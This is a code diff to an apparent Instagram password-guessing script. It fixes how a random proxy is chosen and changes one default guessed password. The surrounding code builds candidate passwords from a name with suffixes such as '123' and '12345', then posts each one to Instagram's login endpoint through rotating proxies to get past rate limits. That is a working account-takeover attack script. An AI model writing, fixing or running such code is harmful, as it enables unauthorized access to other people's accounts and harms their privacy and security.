@@ -58,8 +58,7 @@ def pkwd():
            time.sleep(1)
            prx()
        fi=rr.strip().split('\n')
-       b=fi[0]
-       rd=random.choice(b)
+       rd=random.choice(fi)
        pro={
        "http":f"http://{rd}",
        "hrtps":f"https://{rd}"}
@@ -130,8 +129,7 @@ def gpkwd():
           time.sleep(1)
           prx()
     fi=rr.strip().split('\n')
-    b=fi[0]
-    rd=random.choice(b)
+    rd=random.choice(fi)
     pro={
     "http":f"http://{rd}",
     "hrtps":f"https://{rd}"}    
@@ -153,7 +151,7 @@ def gpkwd():
                          str(x) + "123",
                          str(x) + "12345",
                    ]
-                   litpas.append('Sayang123')
+                   litpas.append('Doraemon123')
                    for passw in set(litpas):
                        time.sleep(2)
                        reg = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=ua, data={'username': us,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{passw}','queryParams': '{}'}, proxies=pro, timeout=10)
